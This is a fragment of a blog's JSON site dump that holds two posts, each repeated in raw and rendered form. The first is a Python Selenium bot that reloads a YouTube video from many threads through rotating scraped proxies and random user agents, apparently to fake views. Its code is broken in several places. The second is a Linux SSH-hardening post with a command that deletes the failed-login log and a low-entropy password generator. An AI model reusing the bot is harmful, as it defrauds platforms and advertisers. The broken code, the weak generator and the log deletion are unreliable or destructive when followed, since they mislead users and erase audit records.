class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import os</span><br><span class=\"line\">import re</span><br><span class=\"line\">import requests</span><br><span class=\"line\">from os import _exit</span><br><span class=\"line\">from time import sleep</span><br><span class=\"line\">from random import choice,uniform</span><br><span class=\"line\">from threading import Thread</span><br><span class=\"line\">from argparse import ArgumentParser</span><br><span class=\"line\">from selenium import webdriver</span><br><span class=\"line\">from selenium.webdriver.common.proxy import Proxy,ProxyType</span><br><span class=\"line\">from fake_useragent import UserAgent</span><br><span class=\"line\">from os import path</span><br><span class=\"line\">osproxy = &quot;http://127.0.0.1:8888&quot;</span><br><span class=\"line\">sysProxy = False</span><br><span class=\"line\">test = False</span><br><span class=\"line\">proxy_pool_url = &apos;http://ip.jiangxianli.com&apos;</span><br><span class=\"line\"># os.environ[&apos;http_proxy&apos;] = osproxy </span><br><span class=\"line\"># os.environ[&apos;HTTP_PROXY&apos;] = osproxy</span><br><span class=\"line\"># os.environ[&apos;https_proxy&apos;] = osproxy</span><br><span class=\"line\"># os.environ[&apos;HTTPS_PROXY&apos;] = osproxy</span><br><span class=\"line\"></span><br><span class=\"line\">def load_arg():</span><br><span class=\"line\">    args = &#123;&#125;</span><br><span class=\"line\">    args[&quot;url&quot;] = &quot;https://youtu.be/0eG76YapPPE&quot;</span><br><span class=\"line\">    args[&quot;threads&quot;] = 10</span><br><span class=\"line\">    args[&quot;duration&quot;] = 5</span><br><span class=\"line\">    args[&quot;proxies&quot;] = None</span><br><span class=\"line\">    return args</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">def test_proxy(osproxy):</span><br><span class=\"line\">    print(osproxy)</span><br><span class=\"line\">    os.environ[&apos;http_proxy&apos;] = osproxy </span><br><span class=\"line\">    os.environ[&apos;HTTP_PROXY&apos;] = osproxy</span><br><span class=\"line\">    os.environ[&apos;https_proxy&apos;] = osproxy</span><br><span class=\"line\">    os.environ[&apos;HTTPS_PROXY&apos;] = osproxy</span><br><span class=\"line\">    result = requests.get(&quot;http://www.baidu.com&quot;)</span><br><span class=\"line\">    print(result)</span><br><span class=\"line\">    </span><br><span class=\"line\">def load_proxy():</span><br><span class=\"line\">    if args[&quot;proxies&quot;] is not None:</span><br><span class=\"line\">        proxies=open(args[&quot;proxies&quot;],&apos;r&apos;).read().split(&apos;\\n&apos;)</span><br><span class=\"line\">    else:</span><br><span class=\"line\">        proxies=re.findall(re.compile(&apos;&lt;td&gt;([\\d.]+)&lt;/td&gt;&apos;),str(requests.get(proxy_pool_url).content))</span><br><span class=\"line\">        proxies=[&apos;%s:%s&apos;%x for x in list(zip(proxies[1::3],proxies[2::3]))]</span><br><span class=\"line\">        </span><br><span class=\"line\">    print(&apos;%d proxies successfully loaded!&apos;%len(proxies))</span><br><span class=\"line\">    p=Proxy()</span><br><span class=\"line\">    p.proxy_type=ProxyType.MANUAL</span><br><span class=\"line\">    return p, proxies</span><br><span class=\"line\"></span><br><span class=\"line\">def bot_config(url):</span><br><span class=\"line\">    proxy, proxies = load_proxy()</span><br><span class=\"line\">    if sysProxy:</span><br><span class=\"line\">        proxy.http_proxy = osproxy</span><br><span class=\"line\">    else: </span><br><span class=\"line\">        proxy.http_proxy=choice(proxies)</span><br><span class=\"line\">        </span><br><span class=\"line\">    proxy.autodetect = False</span><br><span class=\"line\">    proxy.ssl_proxy=proxy.http_proxy</span><br><span class=\"line\">    print(proxy.http_proxy)</span><br><span class=\"line\">    chrome_options=webdriver.ChromeOptions()</span><br><span class=\"line\">    chrome_options.add_argument(&apos;--mute-audio&apos;)</span><br><span class=\"line\">    chrome_options.add_argument(&apos;--no-sandbox&apos;)</span><br><span class=\"line\">    chrome_options.add_argument(&apos;ignore-certificate-errors&apos;)</span><br><span class=\"line\">    chrome_options.add_argument(&apos;----headless&apos;)</span><br><span class=\"line\">    chrome_options.add_argument(&apos;--no-startup-window&apos;)</span><br><span class=\"line\">    chrome_options.add_argument(&apos;user-agent=&quot;&#123;&#125;&quot;&apos;.format(agent.random))</span><br><span class=\"line\">    chrome_options.add_argument(&quot;--proxy-server=http://&#123;&#125;&quot;.format(proxy.http_proxy))</span><br><span class=\"line\">    print(chrome_options.arguments)</span><br><span class=\"line\">    print(&quot;loaded add_argument&quot;)</span><br><span class=\"line\">    capabilities=webdriver.DesiredCapabilities.CHROME</span><br><span class=\"line\">    proxy.add_to_capabilities(capabilities)</span><br><span class=\"line\">    print(&quot;loaded capabilities&quot;)</span><br><span class=\"line\">    chrome_options.binary_location = &quot;C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe&quot;</span><br><span class=\"line\">    chrome_driver_binary = &quot;./chromedriver.exe&quot;</span><br><span class=\"line\">    driver=webdriver.Chrome(executable_path = chrome_driver_binary,  options=chrome_options,desired_capabilities=capabilities)</span><br><span class=\"line\">    print(&quot;loaded driver&quot;)</span><br><span class=\"line\">    print(driver.get(args[&quot;url&quot;]))</span><br><span class=\"line\">    print(&quot;sleeping&quot;,args[&quot;duration&quot;])</span><br><span class=\"line\">    sleep(args[&quot;duration&quot;])</span><br><span class=\"line\">    driver.close()</span><br><span class=\"line\">    print(&quot;driver closed&quot;)</span><br><span class=\"line\">    </span><br><span class=\"line\">def bot(url):</span><br><span class=\"line\">    try:</span><br><span class=\"line\">        while True:</span><br><span class=\"line\">            bot_config(url)</span><br><span class=\"line\">    except Exception as e:</span><br><span class=\"line\">        print(e)</span><br><span class=\"line\">        _exit(0)</span><br><span class=\"line\">    </span><br><span class=\"line\">def Ebot(url):</span><br><span class=\"line\">    while True:</span><br><span class=\"line\">        bot_config(url)</span><br><span class=\"line\">        </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">def main():</span><br><span class=\"line\">    args = load_arg()</span><br><span class=\"line\">    agent=UserAgent()</span><br><span class=\"line\">    for i in range(args[&quot;threads&quot;]):</span><br><span class=\"line\">        t=Thread(target=Ebot,args=(args[&quot;url&quot;],))</span><br><span class=\"line\">        t.deamon=True</span><br><span class=\"line\">        t.start()</span><br><span class=\"line\">        sleep(uniform(1.5,3.0))</span><br><span class=\"line\">    </span><br><span class=\"line\">if __name__ = &quot;__main__&quot;:</span><br><span class=\"line\">    if test:                </span><br><span class=\"line\">        args = load_arg()</span><br><span class=\"line\">        proxy, proxies = load_proxy() </span><br><span class=\"line\">        test_proxy(choice(proxies))</span><br><span class=\"line\">    else:</span><br><span class=\"line\">        main()</span><br></pre></td></tr></table></figure>","site":{"data":{}},"excerpt":"","more":"<p>Well I think I should show my code first, then talk about the method. </p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import os</span><br><span class=\"line\">import re</span><br><span class=\"line\">import requests</span><br><span class=\"line\">from os import _exit</span><br><span class=\"line\">from time import sleep</span><br><span class=\"line\">from random import choice,uniform</span><br><span class=\"line\">from threading import Thread</span><br><span class=\"line\">from argparse import ArgumentParser</span><br><span class=\"line\">from selenium import webdriver</span><br><span class=\"line\">from selenium.webdriver.common.proxy import Proxy,ProxyType</span><br><span class=\"line\">from fake_useragent import UserAgent</span><br><span class=\"line\">from os import path</span><br><span class=\"line\">osproxy = &quot;http://127.0.0.1:8888&quot;</span><br><span class=\"line\">sysProxy = False</span><br><span class=\"line\">test = False</span><br><span class=\"line\">proxy_pool_url = &apos;http://ip.jiangxianli.com&apos;</span><br><span class=\"line\"># os.environ[&apos;http_proxy&apos;] = osproxy </span><br><span class=\"line\"># os.environ[&apos;HTTP_PROXY&apos;] = osproxy</span><br><span class=\"line\"># os.environ[&apos;https_proxy&apos;] = osproxy</span><br><span class=\"line\"># os.environ[&apos;HTTPS_PROXY&apos;] = osproxy</span><br><span class=\"line\"></span><br><span class=\"line\">def load_arg():</span><br><span class=\"line\">    args = &#123;&#125;</span><br><span class=\"line\">    args[&quot;url&quot;] = &quot;https://youtu.be/0eG76YapPPE&quot;</span><br><span class=\"line\">    args[&quot;threads&quot;] = 10</span><br><span class=\"line\">    args[&quot;duration&quot;] = 5</span><br><span class=\"line\">    args[&quot;proxies&quot;] = None</span><br><span class=\"line\">    return args</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">def test_proxy(osproxy):</span><br><span class=\"line\">    print(osproxy)</span><br><span class=\"line\">    os.environ[&apos;http_proxy&apos;] = osproxy </span><br><span class=\"line\">    os.environ[&apos;HTTP_PROXY&apos;] = osproxy</span><br><span class=\"line\">    os.environ[&apos;https_proxy&apos;] = osproxy</span><br><span class=\"line\">    os.environ[&apos;HTTPS_PROXY&apos;] = osproxy</span><br><span class=\"line\">    result = requests.get(&quot;http://www.baidu.com&quot;)</span><br><span class=\"line\">    print(result)</span><br><span class=\"line\">    </span><br><span class=\"line\">def load_proxy():</span><br><span class=\"line\">    if args[&quot;proxies&quot;] is not None:</span><br><span class=\"line\">        proxies=open(args[&quot;proxies&quot;],&apos;r&apos;).read().split(&apos;\\n&apos;)</span><br><span class=\"line\">    else:</span><br><span class=\"line\">        proxies=re.findall(re.compile(&apos;&lt;td&gt;([\\d.]+)&lt;/td&gt;&apos;),str(requests.get(proxy_pool_url).content))</span><br><span class=\"line\">        proxies=[&apos;%s:%s&apos;%x for x in list(zip(proxies[1::3],proxies[2::3]))]</span><br><span class=\"line\">        </span><br><span class=\"line\">    print(&apos;%d proxies successfully loaded!&apos;%len(proxies))</span><br><span class=\"line\">    p=Proxy()</span><br><span class=\"line\">    p.proxy_type=ProxyType.MANUAL</span><br><span class=\"line\">    return p, proxies</span><br><span class=\"line\"></span><br><span class=\"line\">def bot_config(url):</span><br><span class=\"line\">    proxy, proxies = load_proxy()</span><br><span class=\"line\">    if sysProxy:</span><br><span class=\"line\">        proxy.http_proxy = osproxy</span><br><span class=\"line\">    else: </span><br><span class=\"line\">        proxy.http_proxy=choice(proxies)</span><br><span class=\"line\">        </span><br><span class=\"line\">    proxy.autodetect = False</span><br><span class=\"line\">    proxy.ssl_proxy=proxy.http_proxy</span><br><span class=\"line\">    print(proxy.http_proxy)</span><br><span class=\"line\">    chrome_options=webdriver.ChromeOptions()</span><br><span class=\"line\">    chrome_options.add_argument(&apos;--mute-audio&apos;)</span><br><span class=\"line\">    chrome_options.add_argument(&apos;--no-sandbox&apos;)</span><br><span class=\"line\">    chrome_options.add_argument(&apos;ignore-certificate-errors&apos;)</span><br><span class=\"line\">    chrome_options.add_argument(&apos;----headless&apos;)</span><br><span class=\"line\">    chrome_options.add_argument(&apos;--no-startup-window&apos;)</span><br><span class=\"line\">    chrome_options.add_argument(&apos;user-agent=&quot;&#123;&#125;&quot;&apos;.format(agent.random))</span><br><span class=\"line\">    chrome_options.add_argument(&quot;--proxy-server=http://&#123;&#125;&quot;.format(proxy.http_proxy))</span><br><span class=\"line\">    print(chrome_options.arguments)</span><br><span class=\"line\">    print(&quot;loaded add_argument&quot;)</span><br><span class=\"line\">    capabilities=webdriver.DesiredCapabilities.CHROME</span><br><span class=\"line\">    proxy.add_to_capabilities(capabilities)</span><br><span class=\"line\">    print(&quot;loaded capabilities&quot;)</span><br><span class=\"line\">    chrome_options.binary_location = &quot;C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe&quot;</span><br><span class=\"line\">    chrome_driver_binary = &quot;./chromedriver.exe&quot;</span><br><span class=\"line\">    driver=webdriver.Chrome(executable_path = chrome_driver_binary,  options=chrome_options,desired_capabilities=capabilities)</span><br><span class=\"line\">    print(&quot;loaded driver&quot;)</span><br><span class=\"line\">    print(driver.get(args[&quot;url&quot;]))</span><br><span class=\"line\">    print(&quot;sleeping&quot;,args[&quot;duration&quot;])</span><br><span class=\"line\">    sleep(args[&quot;duration&quot;])</span><br><span class=\"line\">    driver.close()</span><br><span class=\"line\">    print(&quot;driver closed&quot;)</span><br><span class=\"line\">    </span><br><span class=\"line\">def bot(url):</span><br><span class=\"line\">    try:</span><br><span class=\"line\">        while True:</span><br><span class=\"line\">            bot_config(url)</span><br><span class=\"line\">    except Exception as e:</span><br><span class=\"line\">        print(e)</span><br><span class=\"line\">        _exit(0)</span><br><span class=\"line\">    </span><br><span class=\"line\">def Ebot(url):</span><br><span class=\"line\">    while True:</span><br><span class=\"line\">        bot_config(url)</span><br><span class=\"line\">        </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">def main():</span><br><span class=\"line\">    args = load_arg()</span><br><span class=\"line\">    agent=UserAgent()</span><br><span class=\"line\">    for i in range(args[&quot;threads&quot;]):</span><br><span class=\"line\">        t=Thread(target=Ebot,args=(args[&quot;url&quot;],))</span><br><span class=\"line\">        t.deamon=True</span><br><span class=\"line\">        t.start()</span><br><span class=\"line\">        sleep(uniform(1.5,3.0))</span><br><span class=\"line\">    </span><br><span class=\"line\">if __name__ = &quot;__main__&quot;:</span><br><span class=\"line\">    if test:                </span><br><span class=\"line\">        args = load_arg()</span><br><span class=\"line\">        proxy, proxies = load_proxy() </span><br><span class=\"line\">        test_proxy(choice(proxies))</span><br><span class=\"line\">    else:</span><br><span class=\"line\">        main()</span><br></pre></td></tr></table></figure>"},{"layout":"title","title":"Prevent your machine from attacking","date":"2017-09-21T14:11:06.000Z","_content":"\nYou may heard about botnet, which is a network of infected computers that can be controlled remotely, forcing them to send spam, spread viruses, or stage DDoS attacks without the consent of the computers’ owners.\n\nIn the public network, hackers keep cracking your machine and want to capture your machine to become botnet.\n\nHowever, most of us still feel confident about the cloud vendor and feel relief that we still not losing the control of the machine. But if your carefully check your usage of the cpu/memory, login history and other record. Someone may inject some bitcoin mining scripts on your machine a year ago. \n\n## Intro.\n\nTry this command to watch the login record:\n\n    du -sh `ls /var/log | grep btmp\n\nThis file storage the login fail record of ssh. The larger size of the file, the more dangerous your server is undering. This is a simple and old cracking method, but still efficient.\n\nLarger part of the server use weak password, which using `root` as login username, password is sucession number and still using `22` as default login port. \n\n## Check More Record\n\n+ `/var/log/wtmp` is used for record sucessful login information. This is a binary format file. Only using `last` command is able to check its contents.\n\n```\nroot     pts/0        *.*.*.*    Sat Feb 16 12:29   still logged in\nroot     pts/0        *.*.*.*   Fri Feb 15 20:42 - 20:55  (00:12)\nroot     pts/0        *.*.*.*   Thu Feb 14 13:27 - 18:55  (05:27)\nroot     pts/0        *.*.*.*    Wed Feb 13 21:31 - 23:07  (01:36)\n```\nCheck the top 10 malvolence login IP:\n\n    sudo lastb | awk '{ print $3}' | awk '{++S[$NF]} END {for(a in S) print a, S[a]}' | sort -rk2 |head\n\nCheck the times of malvolence login time:\n\n    lastb | awk '{ print $3}' | sort | uniq -c | sort -n\n\nIf you want to clear this log:\n\n    rm -rf /var/log/btmp\n    touch /var/log/btmp\n+ `/var/log/btmp` is used to record the failed login IP. Using `lastb` to check its content. \n\n+ `/var/login/lastlog` is used to record user login history. Using `lastlog`\n\n+ `/var/login/utmp` is used to record current user information. Using `who`\n\n## SSH\n\n+ change `ssh` default port\n```\n    vi /etc/ssh/sshd_config\n```\n+ restart `sshd` service \n```\n    systemctl restart sshd\n    systemctl status sshd\n```\n+ add `iptables`\n```\n    # iptables config file location: /etc/sysconfig/iptables\n    iptables -A INPUT -m state --state NEW -m tcp -p tcp --dport 1000 -j ACCEPT\n    # add 1000 port rule\n    service iptables save\n    service iptables restart\n```\n+ or using `firewall-cmd`\n```\n    firewall-cmd --state\n\n    systemctl start firewalld\n    systemctl enable firewalld\n\n    # check default/active zone \n    firewall-cmd --get-default-zone\n    firewall-cmd --get-active-zones\n    # open port\n    firewall-cmd --permanent --zone=public --add-port=22/tcp\n    firewall-cmd --permanent --zone=public --add-port=1000/tcp\n    # reload firewall \n    firewall-cmd --reload \n\n    # check exposed port \n    firewall-cmd --permanent --list-port \n    firewall-cmd --zone=public --list-all\n```\n\n## Using strong password \n\n```\n    passwd\n```\n\nranddom password generator\n\n```\n    # echo $(getRandomPwd 10)\n    # echo $(getRandomPwd)\n    getRandomPwd(){\n        num=32\n        if [ $# == 1 ];then\n            num=$1\n        fi\n        echo \"$(date +%s)$(shuf -i 10000-65536 -n 1)\" | sha256sum | base64 | head -c $num ; echo\n    }\n```\n\n","source":"_posts/Prevent-your-machine-from-attacking.md","raw":"---\nlayout: title\ntitle: Prevent your machine from attacking\ndate: 2017-09-21 09:11:06\ntags: Linux\ncategories: Tech\n---\n\nYou may heard about botnet, which is a network of infected computers that can be controlled remotely, forcing them to send spam, spread viruses, or stage DDoS attacks without the consent of the computers’ owners.\n\nIn the public network, hackers keep cracking your machine and want to capture your machine to become botnet.\n\nHowever, most of us still feel confident about the cloud vendor and feel relief that we still not losing the control of the machine. But if your carefully check your usage of the cpu/memory, login history and other record. Someone may inject some bitcoin mining scripts on your machine a year ago. \n\n## Intro.\n\nTry this command to watch the login record:\n\n    du -sh `ls /var/log | grep btmp\n\nThis file storage the login fail record of ssh. The larger size of the file, the more dangerous your server is undering. This is a simple and old cracking method, but still efficient.\n\nLarger part of the server use weak password, which using `root` as login username, password is sucession number and still using `22` as default login port. \n\n## Check More Record\n\n+ `/var/log/wtmp` is used for record sucessful login information. This is a binary format file. Only using `last` command is able to check its contents.\n\n```\nroot     pts/0        *.*.*.*    Sat Feb 16 12:29   still logged in\nroot     pts/0        *.*.*.*   Fri Feb 15 20:42 - 20:55  (00:12)\nroot     pts/0        *.*.*.*   Thu Feb 14 13:27 - 18:55  (05:27)\nroot     pts/0        *.*.*.*    Wed Feb 13 21:31 - 23:07  (01:36)\n```\nCheck the top 10 malvolence login IP:\n\n    sudo lastb | awk '{ print $3}' | awk '{++S[$NF]} END {for(a in S) print a, S[a]}' | sort -rk2 |head\n\nCheck the times of malvolence login time:\n\n    lastb | awk '{ print $3}' | sort | uniq -c | sort -n\n\nIf you want to clear this log:\n\n    rm -rf /var/log/btmp\n    touch /var/log/btmp\n+ `/var/log/btmp` is used to record the failed login IP. Using `lastb` to check its content. \n\n+ `/var/login/lastlog` is used to record user login history. Using `lastlog`\n\n+ `/var/login/utmp` is used to record current user information. Using `who`\n\n## SSH\n\n+ change `ssh` default port\n```\n    vi /etc/ssh/sshd_config\n```\n+ restart `sshd` service \n```\n    systemctl restart sshd\n    systemctl status sshd\n```\n+ add `iptables`\n```\n    # iptables config file location: /etc/sysconfig/iptables\n    iptables -A INPUT -m state --state NEW -m tcp -p tcp --dport 1000 -j ACCEPT\n    # add 1000 port rule\n    service iptables save\n    service iptables restart\n```\n+ or using `firewall-cmd`\n```\n    firewall-cmd --state\n\n    systemctl start firewalld\n    systemctl enable firewalld\n\n    # check default/active zone \n    firewall-cmd --get-default-zone\n    firewall-cmd --get-active-zones\n    # open port\n    firewall-cmd --permanent --zone=public --add-port=22/tcp\n    firewall-cmd --permanent --zone=public --add-port=1000/tcp\n    # reload firewall \n    firewall-cmd --reload \n\n    # check exposed port \n    firewall-cmd --permanent --list-port \n    firewall-cmd --zone=public --list-all\n```\n\n## Using strong password \n\n```\n    passwd\n```\n\nranddom password generator\n\n```\n    # echo $(getRandomPwd 10)\n    # echo $(getRandomPwd)\n    getRandomPwd(){\n        num=32\n        if [ $# == 1 ];then\n            num=$1\n        fi\n        echo \"$(date +%s)$(shuf -i 10000-65536 -n 1)\" | sha256sum | base64 | head -c $num ; echo\n    }\n```\n\n","slug":"Prevent-your-machine-from-attacking","published":1,"updated":"2019-02-16T05:07:38.623Z","comments":1,"photos":[],"link":"","_id":"ckkljsarv0006r2421a4xdztw","content":"<p>You may heard about botnet, which is a network of infected computers that can be controlled remotely, forcing them to send spam, spread viruses, or stage DDoS attacks without the consent of the computers’ owners.</p>\n<p>In the public network, hackers keep cracking your machine and want to capture your machine to become botnet.</p>\n<p>However, most of us still feel confident about the cloud vendor and feel relief that we still not losing the control of the machine. But if your carefully check your usage of the cpu/memory, login history and other record. Someone may inject some bitcoin mining scripts on your machine a year ago. </p>\n<h2 id=\"Intro\"><a href=\"#Intro\" class=\"headerlink\" title=\"Intro.\"></a>Intro.</h2><p>Try this command to watch the login record:</p>\n<pre><code>du -sh `ls /var/log | grep btmp\n</code></pre><p>This file storage the login fail record of ssh. The larger size of the file, the more dangerous your server is undering. This is a simple and old cracking method, but still efficient.</p>\n<p>Larger part of the server use weak password, which using <code>root</code> as login username, password is sucession number and still using <code>22</code> as default login port. </p>\n<h2 id=\"Check-More-Record\"><a href=\"#Check-More-Record\" class=\"headerlink\" title=\"Check More Record\"></a>Check More Record</h2><ul>\n<li><code>/var/log/wtmp</code> is used for record sucessful login information. This is a binary format file. Only using <code>last</code> command is able to check its contents.</li>\n</ul>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">root     pts/0        *.*.*.*    Sat Feb 16 12:29   still logged in</span><br><span class=\"line\">root     pts/0        *.*.*.*   Fri Feb 15 20:42 - 20:55  (00:12)</span><br><span class=\"line\">root     pts/0        *.*.*.*   Thu Feb 14 13:27 - 18:55  (05:27)</span><br><span class=\"line\">root     pts/0        *.*.*.*    Wed Feb 13 21:31 - 23:07  (01:36)</span><br></pre></td></tr></table></figure>\n<p>Check the top 10 malvolence login IP:</p>\n<pre><code>sudo lastb | awk &apos;{ print $3}&apos; | awk &apos;{++S[$NF]} END {for(a in S) print a, S[a]}&apos; | sort -rk2 |head\n</code></pre><p>Check the times of malvolence login time:</p>\n<pre><code>lastb | awk &apos;{ print $3}&apos; | sort | uniq -c | sort -n\n</code></pre><p>If you want to clear this log:</p>\n<pre><code>rm -rf /var/log/btmp\ntouch /var/log/btmp\n</code></pre><ul>\n<li><p><code>/var/log/btmp</code> is used to record the failed login IP. Using <code>lastb</code> to check its content. </p>\n</li>\n<li><p><code>/var/login/lastlog</code> is used to record user login history. Using <code>lastlog</code></p>\n</li>\n<li><p><code>/var/login/utmp</code> is used to record current user information. Using <code>who</code></p>\n</li>\n</ul>\n<h2 id=\"SSH\"><a href=\"#SSH\" class=\"headerlink\" title=\"SSH\"></a>SSH</h2><ul>\n<li><p>change <code>ssh</code> default port</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">vi /etc/ssh/sshd_config</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>restart <code>sshd</code> service </p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">systemctl restart sshd</span><br><span class=\"line\">systemctl status sshd</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>add <code>iptables</code></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># iptables config file location: /etc/sysconfig/iptables</span><br><span class=\"line\">iptables -A INPUT -m state --state NEW -m tcp -p tcp --dport 1000 -j ACCEPT</span><br><span class=\"line\"># add 1000 port rule</span><br><span class=\"line\">service iptables save</span><br><span class=\"line\">service iptables restart</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>or using <code>firewall-cmd</code></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">firewall-cmd --state</span><br><span class=\"line\"></span><br><span class=\"line\">systemctl start firewalld</span><br><span class=\"line\">systemctl enable firewalld</span><br><span class=\"line\"></span><br><span class=\"line\"># check default/active zone </span><br><span class=\"line\">firewall-cmd --get-default-zone</span><br><span class=\"line\">firewall-cmd --get-active-zones</span><br><span class=\"line\"># open port</span><br><span class=\"line\">firewall-cmd --permanent --zone=public --add-port=22/tcp</span><br><span class=\"line\">firewall-cmd --permanent --zone=public --add-port=1000/tcp</span><br><span class=\"line\"># reload firewall </span><br><span class=\"line\">firewall-cmd --reload </span><br><span class=\"line\"></span><br><span class=\"line\"># check exposed port </span><br><span class=\"line\">firewall-cmd --permanent --list-port </span><br><span class=\"line\">firewall-cmd --zone=public --list-all</span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n<h2 id=\"Using-strong-password\"><a href=\"#Using-strong-password\" class=\"headerlink\" title=\"Using strong password\"></a>Using strong password</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">passwd</span><br></pre></td></tr></table></figure>\n<p>randdom password generator</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># echo $(getRandomPwd 10)</span><br><span class=\"line\"># echo $(getRandomPwd)</span><br><span class=\"line\">getRandomPwd()&#123;</span><br><span class=\"line\">    num=32</span><br><span class=\"line\">    if [ $# == 1 ];then</span><br><span class=\"line\">        num=$1</span><br><span class=\"line\">    fi</span><br><span class=\"line\">    echo &quot;$(date +%s)$(shuf -i 10000-65536 -n 1)&quot; | sha256sum | base64 | head -c $num ; echo</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n","site":{"data":{}},"excerpt":"","more":"<p>You may heard about botnet, which is a network of infected computers that can be controlled remotely, forcing them to send spam, spread viruses, or stage DDoS attacks without the consent of the computers’ owners.</p>\n<p>In the public network, hackers keep cracking your machine and want to capture your machine to become botnet.</p>\n<p>However, most of us still feel confident about the cloud vendor and feel relief that we still not losing the control of the machine. But if your carefully check your usage of the cpu/memory, login history and other record. Someone may inject some 